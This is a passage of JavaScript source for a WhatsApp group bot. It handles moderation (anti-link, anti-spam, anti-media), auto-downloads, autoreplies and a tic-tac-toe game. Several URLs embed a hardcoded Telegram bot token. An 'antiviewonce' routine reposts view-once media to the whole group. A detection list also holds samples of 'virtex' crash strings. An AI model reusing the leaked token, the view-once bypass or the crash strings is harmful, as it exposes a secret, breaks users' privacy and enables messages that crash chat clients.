            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
        
        async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replygcaespisp('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const ArielSPresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'DGaespisp',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            ArielSPresult.push(result)
        }
    resolve(ArielSPresult)
    })
}
//mega download
function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';

    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));

    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

//trace anime
function formatDuration(ms) {
  let seconds = Math.floor((ms / 1000) % 60);
  let minutes = Math.floor((ms / (1000 * 60)) % 60);
  let hours = Math.floor((ms / (1000 * 60 * 60)) % 24);
  return `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
}
        
        //limit func
        async function useLimit(senuseLimitder, amount) {
            db.data.users[sender].limit -= amount
            db.data.users[sender].totalLimit += amount
            replygcaespisp(`You have used up: ${amount} limit\nRemaining: ${db.data.users[sender].limit} limit`)
        }
        async function resetLimit() {
            let users = Object.keys(global.db.data.users)
            let Limitaespisp = isPremium ? limit.prem : limit.free
            for (let i of users) {
               db.data.users[i].limit = Limitaespisp
            }
            ArielStore.sendText('120363167338947238@g.us', { text: `Reset Limit`})
        }
        // Grup Only
        if (!m.isGroup && !aespispTheCreator && db.data.settings[botNumber].onlygrub ) {
        	if (isCommand){
            return replygcaespisp(`Hello buddy! Because We Want to Reduce Spam, Please Use Bot in the Group Chat !\n\nIf you have issue please chat owner wa.me/${ownernumber}`)
            }
        }
        // Private Only
        if (!aespispTheCreator && db.data.settings[botNumber].onlypc && m.isGroup) {
        	if (isCommand){
	         return replygcaespisp("Hello buddy! if you want to use this bot, please chat the bot in private chat")
	     }
	}
	     
        if (!ArielStore.public) {
            if (aespispTheCreator && !m.key.fromMe) return
        }
        if (db.data.settings[botNumber].online) {
        	if (isCommand) {
        	ArielStore.sendPresenceUpdate('unavailable', from)
        }
        }
        if (db.data.settings[botNumber].autoread) {
            ArielStore.readMessages([m.key])
        }
        //auto set bio\\
	if (db.data.settings[botNumber].autobio) {
            ArielStore.updateProfileStatus(`${botname} Have Been Running For ${runtime(process.uptime())}`).catch(_ => _)
        }
     //auto type record
        if (db.data.settings[botNumber].autorecordtype){
        if (isCommand) {
            let aespispmix = ['composing', 'recording']
            aespispmix2 = aespispmix[Math.floor(aespispmix.length * Math.random())]
            ArielStore.sendPresenceUpdate(aespispmix2, from)
        }
        }
        if (db.data.settings[botNumber].autorecord){
        if (isCommand) {
        	let aespispmix = ['recording']
            aespispmix2 = aespispmix[Math.floor(aespispmix.length * Math.random())]
            ArielStore.sendPresenceUpdate(aespispmix2, from)
        }
        }
        if (db.data.settings[botNumber].autotype){
        if (isCommand) {
        	let aespisppos = ['composing']
            ArielStore.sendPresenceUpdate(aespisppos, from)
        }
        }
        
        //auto block number
        if (m.sender.startsWith(`${autoblocknumber}`) && db.data.settings[botNumber].autoblocknum === true) {
            return ArielStore.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('62') && db.data.settings[botNumber].onlyindo === true) {
            return ArielStore.updateBlockStatus(m.sender, 'block')
        } 
        if (!m.sender.startsWith(`${antiforeignnumber}`) && db.data.chats[m.chat].antiforeignnum === true){ 
        	if (aespispTheCreator || isAdmins || !isBotAdmins) return
            ArielStore.sendMessage(m.chat, { text: `Sorry buddy! you will be removed because the group admin/owner has enabled anti foreign number, only +${antiforeignnumber} country code is allowed to join the group` }, {quoted: m})
            await sleep(2000)
            await ArielStore.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        let list = []
for (let i of owner) {
list.push({
	    	displayName: await ArielStore.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await ArielStore.getName(i)}\nFN:${await ArielStore.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ownkece}\nitem2.X-ABLabel:Instagram\nitem3.URL:${socialm}\nitem3.X-ABLabel:Location\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
        //console log
        if (isCommand) {
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
            console.log(chalk.black(chalk.bgWhite(!isCommand ? '[ MESSAGE ]' : '[ COMMAND ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
            global.db.data.settings[botNumber].totalhit += 1
        }

        //antiviewonce
    if ( db.data.chats[m.chat].antiviewonce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
        let val = { ...m }
        let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
        delete msg[Object.keys(msg)[0]].viewOnce
        val.message = msg
        await ArielStore.sendMessage(m.chat, { forward: val }, { quoted: ftroli })
    }
    
    //antispam kick
if (db.data.chats[m.chat].antispam) {
if (m.isGroup && m.message && aespisp_antispam.isFiltered(from)) {
console.log(`[SPAM]`, color(moment(m.messageTimestamp * 100).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
return await ArielStore.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
    
    // Anti promotion
if (db.data.chats[m.chat].antipromotion) {
if (budy.match(`instagram booster|tiktok booster|ml booster|bgmi selling|selling uc|selling diamonds|selling coin|selling id|selling account|selling ids|buy account|sell account|buy id|sell id|instagram followers|tiktok followers|buy panel|sell panel|sell bug bot|buy bug bot|buy bot bug|sell bot bug|adminpanel5kpm|open jasa push member grup|yangmaubuypanelpm|admin panel 10k pm|Hanya menyediakan Jasa Push Member Grup|admin panel 5k pm|yang mau beli panel murah pm|list harga panel by|list harga vps|LIST HARGA VPS|OPEN JASA PUSH MEMBER GRUP|READY|Redy|LIST HARGA PANEL BY|list harga panel|menyediakan|MENYEDIAKAN|OPEN MURBUG|open|OPEN|PANEL READY|PANEL|PANNEL READY|panel|panel ready|pannel ready minat pm|mau panel pm|MAU PANNEL PM|Admin panel ready|ADMIN PANEL READY|Chat aja om ready selalu|OPEN JASA INSTALL|open jasa installMENYEDIAKAN JASA INSTALL|menyediakan jasa install`)) {
if (!isBotAdmins) return
if(aespispTheCreator) return
if (isAdmins) return
ArielStore.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
ArielStore.sendMessage(from, {text:`\`\`\`「 Promotion Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a promotion message and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
}

        //ANTI VIRUS
if (isGroup && db.data.chats[m.chat].antivirtex) {
if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ') ) {
if (isGroupAdmins) return replygcaespisp('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
ArielStore.sendText(m.chat, `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`)   
if (!isBotAdmins) return
if(aespispTheCreator) return
ArielStore.groupParticipantsUpdate(from, [sender], 'remove')
await ArielStore.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
ArielStore.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Virtex ${isGroup?`in ${groupName}`:''}`})
 }
 }
 
 if (db.data.chats[m.chat].antibot) {
    if (m.isBaileys && m.fromMe == false){
        if (isAdmins || !isBotAdmins){		  
        } else {
          replygcaespisp(`*Another Bot Detected*\n\nHusshhh Get away from this group!!!`)
    return await ArielStore.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }
 
        //anti media
        if (db.data.chats[m.chat].antimedia && isMedia) {
        if (aespispTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcaespisp(`\`\`\`「 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group`)
    return ArielStore.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }
        if (db.data.chats[m.chat].image && isArielFolder) {
    if(isArielFolder === "imageMessage"){
        if (aespispTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcaespisp(`\`\`\`「 Image Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-image for this group`)
    return ArielStore.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antivideo && isArielFolder) {
    if(isArielFolder === "videoMessage"){
        if (aespispTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcaespisp(`\`\`\`「 Video Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-video for this group`)
    return ArielStore.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antisticker && isArielFolder) {
    if(isArielFolder === "stickerMessage"){
        if (aespispTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcaespisp(`\`\`\`「 Sticker Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group`)
    return ArielStore.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antiaudio && isArielFolder) {
    if(isArielFolder === "audioMessage"){
        if (aespispTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcaespisp(`\`\`\`「 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group`)
    return ArielStore.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antipoll && isArielFolder) {
    if(isArielFolder === "pollCreationMessage"){
        if (aespispTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcaespisp(`\`\`\`「 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group`)
    return ArielStore.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antilocation && isArielFolder) {
    if(isArielFolder === "locationMessage"){
        if (aespispTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcaespisp(`\`\`\`「 Location Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-location for this group`)
    return ArielStore.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antidocument && isArielFolder) {
    if(isArielFolder === "documentMessage"){
        if (aespispTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcaespisp(`\`\`\`「 Document Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-document for this group`)
    return ArielStore.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
      if (db.data.chats[m.chat].anticontact && isArielFolder) {
    if(isArielFolder === "contactMessage"){
        if (aespispTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcaespisp(`\`\`\`「 Contact Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-contact for this group`)
    return ArielStore.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        //respond
        if (db.data.chats[m.chat].badword) {
            for (let bak of bad) {
               if (budy === bak) {
                  let baduser = await db.data.users[sender].badword
                  ArielStore.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ArielStore.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was using harsh words and his chat has been deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
               }
            }
        }
        //auto download #ctto
        if (db.data.settings[botNumber].autodownload && !m.key.fromMe && !isCmd2) {
try {
if (budy.match(`instagram.com`)) {
await ArielStore.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/instagram?url=${budy}`)
ArielStore.sendMessage(m.chat, { video: { url: anu.result.media}, caption: `Auto Download ✅`}, {quoted: m})
await ArielStore.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`tiktok.com`)) {
await ArielStore.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/tiktok?url=${budy}`)
ArielStore.sendMessage(m.chat, { video: { url: anu.result.Medium.url}, caption: `Auto Download ✅`}, {quoted: m})
await ArielStore.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`facebook.com`)) {
await ArielStore.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/facebook?url=${budy}`)
ArielStore.sendMessage(m.chat, { video: { url: anu.result.video_sd}, caption: `Auto Download ✅`}, {quoted: m})
await ArielStore.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`youtube.com|youtu.be`)) {
await ArielStore.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/ytmp4?url=${budy}`)
ArielStore.sendMessage(m.chat, { video: { url: anu.result.result}, caption: ``}, {quoted: m})
await ArielStore.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} 
} catch (err) {
await ArielStore.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
} 
        
        //autosticker
        if (db.data.settings[botNumber].autosticker) {
        	if (m.key.fromMe) return
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                ArielStore.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.ownername })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                ArielStore.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.ownername })
            }
        }
        
        if (db.data.chats[m.chat].antilinkgc) {
            if (budy.match(`chat.whatsapp.com`)) {
               bvl = `\`\`\`「 GC Link Detected 」\`\`\`\n\nAdmin has sent a gc link, admin is free to send any link😇`
if (isAdmins) return replygcaespisp(bvl)
if (m.key.fromMe) return replygcaespisp(bvl)
if (aespispTheCreator) return replygcaespisp(bvl)
               await ArielStore.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ArielStore.sendMessage(from, {text:`\`\`\`「 GC Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        if (db.data.chats[m.chat].antilink) {
            if (budy.match('http') && budy.match('https')) {
               bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return replygcaespisp(bvl)
if (m.key.fromMe) return replygcaespisp(bvl)
if (aespispTheCreator) return replygcaespisp(bvl)
               await ArielStore.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ArielStore.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        //afk
        let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	     for (let jid of mentionUser) {
            let user = db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            replygcaespisp(`Please Don't Tag Him\nHe's AFK ${reason ? 'With reason ' + reason : 'no reason'}\nAfk Since ${clockString(new Date - afkTime)}`.trim())
        }
        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            replygcaespisp(`You Have Returned From AFK\nAFK Reason: ${user.afkReason ? user.afkReason : ''}\nAFK Duration: ${clockString(new Date - user.afkTime)}`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
        
//total features
const aespispfeature = () =>{
            var mytext = fs.readFileSync("./AespiBotz12.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        
        //download status #ctto
        try {
  const textLower = m.text.toLowerCase();
  if (textLower === 'download' || textLower === 'statusdown' || textLower === 'take' || textLower === 'send') {
    const quotedMessage = m.msg.contextInfo.quotedMessage;
    if (quotedMessage) {
      if (quotedMessage.imageMessage) {
        let imageCaption = quotedMessage.imageMessage.caption;
        let imageUrl = await ArielStore.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        ArielStore.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        replygcaespisp('*Downloading status...*');
      }
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await ArielStore.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        ArielStore.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        replygcaespisp('*Downloading status...*');
      }
    }
  }
} catch (error) {
  console.error("Error in 'send message' handling:", error);
}
        //autoreply
for (let Bhosdikaaespisp of VoiceNoteaespisp) {
if (budy === Bhosdikaaespisp) {
let audiobuffy = fs.readFileSync(`./ArielFolder/audio/${Bhosdikaaespisp}.mp3`)
ArielStore.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: ftroli })     
}
}
for (let Bhosdikaaespisp of Stickeraespisp){
if (budy === Bhosdikaaespisp){
let stickerbuffy = fs.readFileSync(`./ArielFolder/sticker/${Bhosdikaaespisp}.webp`)
ArielStore.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: ftroli })
}
}
for (let Bhosdikaaespisp of Imageaespisp){
if (budy === Bhosdikaaespisp){
let imagebuffy = fs.readFileSync(`./ArielFolder/image/${Bhosdikaaespisp}.jpg`)
ArielStore.sendMessage(m.chat, { image: imagebuffy }, { quoted: ftroli })
}
}
for (let Bhosdikaaespisp of Videoaespisp){
if (budy === Bhosdikaaespisp){
let videobuffy = fs.readFileSync(`./ArielFolder/video/${Bhosdikaaespisp}.mp4`)
ArielStore.sendMessage(m.chat, { video: videobuffy }, { quoted: ftroli })
}
}

const sendapk = (teks) => {
ArielStore.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let Bhosdikaaespisp of Apkaespisp) {
if (budy === Bhosdikaaespisp) {
let buffer = fs.readFileSync(`./ArielFolder/apk/${Bhosdikaaespisp}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
ArielStore.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let Bhosdikaaespisp of Zipaespisp) {
if (budy === Bhosdikaaespisp) {
let buffer = fs.readFileSync(`./ArielFolder/zip/${Bhosdikaaespisp}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
ArielStore.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let Bhosdikaaespisp of Docaespisp) {
if (budy === Bhosdikaaespisp) {
let buffer = fs.readFileSync(`./ArielFolder/doc/${Bhosdikaaespisp}.pdf`)
senddocu(buffer)
}
}

// Response Addlist
if (m.isGroup && isAlreadyResponList(from, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(from, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
ArielStore.sendMessage(from, { text: sendResponList(from, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
ArielStore.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
} 
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
    userJid: ArielStore.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, ArielStore.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
ArielStore.ev.emit('messages.upsert', msg)
} 

//============= [LIST RESPONCE CHECKING START ]================
        if(m.mtype === "interactiveResponseMessage"){
            console.log("interactiveResponseMessage Detected!")   
            let msg = m.message[m.mtype]  || m.msg
            if(msg.nativeFlowResponseMessage  && !m.isBot  ){ 
                let { id } = JSON.parse(msg.nativeFlowResponseMessage.paramsJson) || {}  
                if(id){
                    let emit_msg = { 
                        key : { ...m.key } , // SET RANDOME MESSAGE ID  
                        message:{ extendedTextMessage : { text : id } } ,
                        pushName : m.pushName,
                        messageTimestamp  : m.messageTimestamp || 754785898978
                    }
                    return ArielStore.ev.emit("messages.upsert" , { messages : [ emit_msg ] ,  type : "notify"})
                }
            }
        }
//============= [LIST RESPONCE CHECKING END ]================


//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
	if (m.key.fromMe) return
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await replygcaespisp(`🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else replygcaespisp('*Wrong Answer!*')
        }
        
        //game
        this.game = this.game ? this.game : {}
        let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            // replygcaespisp(`[DEBUG]\n${parseInt(m.text)}`)
            if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) {
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                replygcaespisp({
                    '-3': 'The game is over',
                    '-2': 'Invalid',
                    '-1': 'Invalid Position',
                    0: 'Invalid Position',
                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) ArielStore.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
